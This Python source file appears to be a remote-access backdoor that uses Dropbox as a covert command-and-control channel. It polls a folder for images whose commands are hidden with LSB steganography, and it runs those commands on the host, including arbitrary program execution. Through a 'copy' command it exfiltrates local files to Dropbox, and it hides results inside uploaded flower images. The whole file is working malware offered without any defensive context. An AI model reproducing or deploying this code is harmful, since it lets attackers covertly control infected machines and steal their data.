import re
import subprocess

import dropbox
from dropbox.exceptions import AuthError, ApiError
import schedule
import time
import os
from stegano import lsb




ACCESS_TOKEN = '<insert_your_access_token>'
dbx = dropbox.Dropbox(ACCESS_TOKEN)

LAST_FLOWER_ID = 0

def get_id():
    with open("id.txt", 'r') as file:
        data = file.read()
        # Assuming the file contains an integer as the entire content or the first line
        number = int(data.splitlines()[0])
        return number

def check_for_command():
    global LAST_FLOWER_ID
    print("Checking for cmd")
    try:
        response = dbx.files_list_folder("/flowers")
        for entry in response.entries:
            file_number = extract_number(entry.name)
            if file_number and file_number > LAST_FLOWER_ID:
                LAST_FLOWER_ID = file_number
                download_file(entry.path_lower, entry.name)
                command = reveal_secret(entry.name)
                print("got command: " + str(command))
                response = process_command(command)
                print('response: ' + response)
                secret = lsb.hide("./Plumeria_clean.jpeg", response)
                secret.save("./PlumeriaSpecial.png")
                #upload file
                upload_file("./PlumeriaSpecial.png", "/fruits/PlumeriaSpecial-from-" + str(get_id()) + "-" + str(file_number))
                #clean up
                os.remove("./PlumeriaSpecial.png")
                os.remove(entry.name)

    except dropbox.exceptions.ApiError as e:
        print(f"Dropbox API Error: {e}")

def reveal_secret(name):
    return lsb.reveal(name)

def extract_number(file_name):
    match = re.search(r'\d+', file_name)
    return int(match.group()) if match else None

def download_file(dropbox_path, local_name):
    local_path = os.path.join('.', local_name)
    try:
        dbx.files_download_to_file(local_path, dropbox_path)
        print(f"Downloaded '{local_name}' to '{local_path}'.")
    except dropbox.exceptions.ApiError as e:
        print(f"Error downloading file: {e}")

def upload_file(file_path, dropbox_path):
    with open(file_path, "rb") as file:
        try:
            dbx.files_upload(file.read(), dropbox_path)
            print(f"File '{dropbox_path}' uploaded successfully.")
        except ApiError as e:
            print(f"API error: {e}")
        except IOError as e:
            print(f"I/O error: {e}")

def process_command(command):
    if command == 'alive':
        return 'im_alive'
    elif command == 'w':
        try:
            result = subprocess.run(['who'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return result.stdout
        except Exception as e:
            return f"An error occurred during who cmd: {e}"
    elif command == 'id':
        try:
            result = subprocess.run(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return result.stdout
        except Exception as e:
            return f"An error occurred during whoami cmd: {e}"
    elif 'copy' in command:
        parts = command.split(' ')
        upload_file(str(parts[1]), '/data/' + str(parts[1]))
        return 'Data sent'
    elif 'exec' in command:
        parts = command.split(' ')
        try:
            result = subprocess.run([str(parts[1])], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return result.stdout
        except Exception as e:
            return f"An error occurred during exec cmd: {e}"
    elif 'ls' in command:
        try:
            result = subprocess.run([str(command)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return result.stdout
        except Exception as e:
            return f"An error occurred during ls cmd: {e}"
    else:
        return "Unknown command"



def find_file_in_dropbox(folder_path):
    try:
        response = dbx.files_list_folder(folder_path)
        for entry in response.entries:
            if is_target_file(entry.name):
                return entry.name
    except dropbox.exceptions.ApiError as e:
        print(f"Dropbox API Error: {e}")
    return None

def is_target_file(file_name):
    return re.match(r'id-\d+\.jpg', file_name)

def delete_file(file_path):
    try:
        dbx.files_delete_v2(file_path)
        return True
    except dropbox.exceptions.ApiError as e:
        print(f"Error deleting file: {e}")
        return False

def extract_id(file_name):
    return re.search(r'id-(\d+)\.jpg', file_name).group(1)


def register_id():
    while True:
        if not os.path.exists('id.txt'):
            file_name = find_file_in_dropbox('/ID')
            if file_name:
                success = delete_file('/ID/' + file_name)
                if success:
                    id = extract_id(file_name)
                    with open('id.txt', 'w') as f:
                        f.write(id)
                    print(f"ID {id} written to id.txt")
                    break
        else:
            print("id.txt already exists.")
            break
        time.sleep(5)


register_id()
# Schedule the task
schedule.every(5).seconds.do(check_for_command)

# Run the schedule
while True:
    schedule.run_pending()
    time.sleep(1)
